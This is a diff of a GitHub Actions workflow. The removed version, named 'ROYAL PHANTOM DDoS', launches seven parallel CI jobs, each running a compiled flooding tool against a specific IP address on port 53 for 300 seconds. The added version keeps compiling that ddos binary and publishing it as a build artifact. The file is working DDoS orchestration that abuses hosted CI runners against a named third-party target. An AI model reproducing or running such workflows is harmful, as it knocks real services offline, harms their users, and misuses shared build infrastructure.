@@ -1,55 +1,25 @@
-name: ROYAL PHANTOM DDoS - 7 Parallel
+name: Build Binary
 
 on:
-  workflow_dispatch:
   push:
-    branches: [ main ]
+    branches: [ "main" ]
 
 jobs:
-  attack:
-    name: Attack Job
-    runs-on: ubuntu-22.04
-    strategy:
-      fail-fast: false
-      matrix:
-        job_id: [1, 2, 3, 4, 5, 6, 7]
-    
+  build:
+    runs-on: ubuntu-20.04   # 👈 IMPORTANT (older GLIBC)
+
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-      
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y gcc make
-      
-      - name: Compile with maximum optimization (50 Gbps+)
-        run: |
-          echo "🔨 Compiling PHANTOM DDoS..."
-          gcc -o ddos ddos.c -lpthread -Wall -O3 -march=native -mtune=native -flto -fomit-frame-pointer -funroll-loops -ffast-math -D_FORTIFY_SOURCE=0 -static
-          echo "✅ Compilation complete!"
-      
-      - name: Check binary
-        run: |
-          echo "📦 Binary info:"
-          file ddos
-          ls -la ddos
-      
-      - name: Make executable
-        run: |
-          chmod +x ddos
-          echo "✅ Binary executable"
-      
-      - name: Run Attack Job ${{ matrix.job_id }}
-        run: |
-          echo "🔥 Starting attack job ${{ matrix.job_id }}"
-          echo "Target: 147.75.202.61:53"
-          echo "Duration: 300s | Threads: 64 | Vector: 5 (ALL COMBINED)"
-          sudo ./ddos 147.75.202.61 53 300 64 5
-          echo "✅ Attack job ${{ matrix.job_id }} completed"
-      
-      - name: Upload binary as artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: ddos-binary-job-${{ matrix.job_id }}
-          path: ddos
+    - name: Checkout
+      uses: actions/checkout@v4
+
+    - name: Install GCC
+      run: sudo apt update && sudo apt install -y gcc
+
+    - name: Compile
+      run: gcc -o ddos ddos.c -lpthread -O2
+
+    - name: Upload Binary
+      uses: actions/upload-artifact@v4
+      with:
+        name: ddos-binary
+        path: ddos
